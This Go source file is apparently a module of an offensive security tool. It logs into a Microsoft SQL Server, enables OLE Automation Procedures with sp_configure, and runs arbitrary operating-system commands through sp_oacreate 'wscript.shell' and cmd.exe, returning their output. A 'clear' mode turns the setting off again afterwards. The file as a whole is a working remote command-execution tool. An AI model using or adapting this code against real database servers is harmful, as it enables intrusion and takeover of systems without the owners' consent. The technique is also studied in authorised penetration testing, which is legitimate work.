package sqlcmdmodule

import (
	"cube/gologger"
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
)

type Mssql2 struct {
	*Sqlcmd
}

func (m Mssql2) SqlcmdName() string {
	return "mssql2"
}

func (m Mssql2) SqlcmdPort() string {
	return "1433"
}

func (m Mssql2) SqlcmdDesc() string {
	return "exec cmd via sp_oacreate wscript.shell"
}

func (m Mssql2) SqlcmdExec() SqlcmdResult {
	result := SqlcmdResult{Sqlcmd: *m.Sqlcmd, Result: "", Err: nil}
	dataSourceName := fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v", m.Ip,
		m.Port, m.User, m.Password, "tempdb")
	conn, err := sql.Open("mssql", dataSourceName)
	defer conn.Close()
	if err != nil {
		result.Err = err
		return result
	}
	if m.Query == "clear" {
		closeOle(*conn)
		gologger.Info("Clear sp_oacreate Successful")
		return result
	}
	OpenOle(*conn)
	osShellOle(*conn, m.Query)

	return result
}

func OpenOle(conn sql.DB) {
	value, err := conn.Prepare("select value_in_use from  sys.configurations where  name = 'Ole Automation Procedures'")
	if err != nil {
		gologger.Error("Prepare failed:", err.Error())
	}
	defer value.Close()

	row := value.QueryRow()
	//var somenumber int64
	var v int
	err = row.Scan(&v)
	if err != nil {
		gologger.Error("Query failed:", err.Error())
	}
	if v == 1 {
		fmt.Printf("sp_oacreate Enabled\n")
	} else {
		fmt.Printf("Open sp_oacreate...\n")
		stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;")
		if err != nil {
			//fmt.Println("Query Error", err)
			return
		}

		defer stmt.Close()
		stmt.Query()

	}
	return
}

func osShellOle(conn sql.DB, cmd string) {
	sqlstr := fmt.Sprint("declare @shell int,@exec int,@text int,@str varchar(8000); \n" +
		"exec sp_oacreate 'wscript.shell',@shell output\nexec sp_oamethod @shell,'exec',@exec output,'c:\\windows\\system32\\cmd.exe /c " + cmd + "'\nexec sp_oamethod @exec, 'StdOut', @text out;\nexec sp_oamethod @text, 'ReadAll', @str out\nselect @str")
	gologger.Debug(sqlstr)
	rows, err := conn.Query(sqlstr)
	if err != nil {
		panic(err.Error())

	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		for _, col := range values {
			if col == nil {
				value = ""
			} else {
				value = string(col)
			}
			fmt.Println(value)

		}

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}

func closeOle(conn sql.DB) {
	stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 0;RECONFIGURE;EXEC sp_configure 'Ole Automation Procedures', 0;RECONFIGURE;")

	if err != nil {
		gologger.Error("Prepare failed:", err.Error())
	}
	stmt.Query()
	defer stmt.Close()

}
